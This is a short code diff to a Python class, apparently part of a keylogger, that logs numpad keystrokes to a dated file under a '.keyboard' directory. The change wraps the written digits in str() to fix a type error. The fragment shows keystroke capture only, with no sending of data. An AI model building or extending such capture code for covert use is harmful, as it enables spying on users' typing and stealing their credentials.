@@ -46,15 +46,15 @@ class C_Keyboard:
         
         with open("{}.keyboard/log_{}.log".format(self.path_log, self.format_date), "a") as file:    
             
-            if str(key) == '<96>':file.write(0)
-            elif str(key) == '<97>':file.write(1)
-            elif str(key) == '<98>':file.write(2)
-            elif str(key) == '<99>':file.write(3)
-            elif str(key) == '<100>':file.write(4)
-            elif str(key) == '<101>':file.write(5)
-            elif str(key) == '<102>':file.write(6)
-            elif str(key) == '<103>':file.write(7)
-            elif str(key) == '<104>':file.write(8)
+            if str(key) == '<96>':file.write(str(0))
+            elif str(key) == '<97>':file.write(str(1))
+            elif str(key) == '<98>':file.write(str(2))
+            elif str(key) == '<99>':file.write(str(3))
+            elif str(key) == '<100>':file.write(str(4))
+            elif str(key) == '<101>':file.write(str(5))
+            elif str(key) == '<102>':file.write(str(6))
+            elif str(key) == '<103>':file.write(str(7))
+            elif str(key) == '<104>':file.write(str(8))
             elif str(key) == '<105>':file.write(str(9))
             # elif key == keyboard.Key.esc:return False# Stop listener
             else:
